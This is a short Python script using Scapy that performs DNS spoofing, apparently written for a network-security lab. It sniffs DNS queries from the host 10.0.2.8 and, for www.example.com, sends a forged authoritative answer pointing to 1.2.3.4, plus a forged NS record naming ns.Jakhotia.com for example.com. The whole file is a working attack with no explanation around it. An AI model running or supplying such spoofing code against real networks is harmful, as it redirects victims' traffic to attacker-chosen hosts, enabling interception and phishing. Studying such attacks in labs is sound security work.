#!/usr/bin/python
from scapy.all import *

def spoof_pkt(pkt):
	if (DNS in pkt and b'www.example.com' in pkt[DNS].qd.qname):
		IP_packet = IP(dst=pkt[IP].src, src=pkt[IP].dst)
		UDP_packet = UDP(dport=pkt[UDP].sport, sport=53)

		Anssec = DNSRR(rrname=pkt[DNS].qd.qname, type='A', rdata='1.2.3.4',ttl=259200)
		NSsec = DNSRR(rrname="example.com", type='NS',rdata='ns.Jakhotia.com',ttl=259200)
		DNSpkt = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1,rd=0,qdcount=1,
			qr=1,ancount=1, nscount=1,an=Anssec, ns=NSsec)
		spoofpkt = IP_packet/UDP_packet/DNSpkt
		send(spoofpkt)

pkt = sniff(filter="udp and src host 10.0.2.8 and dst port 53", prn=spoof_pkt)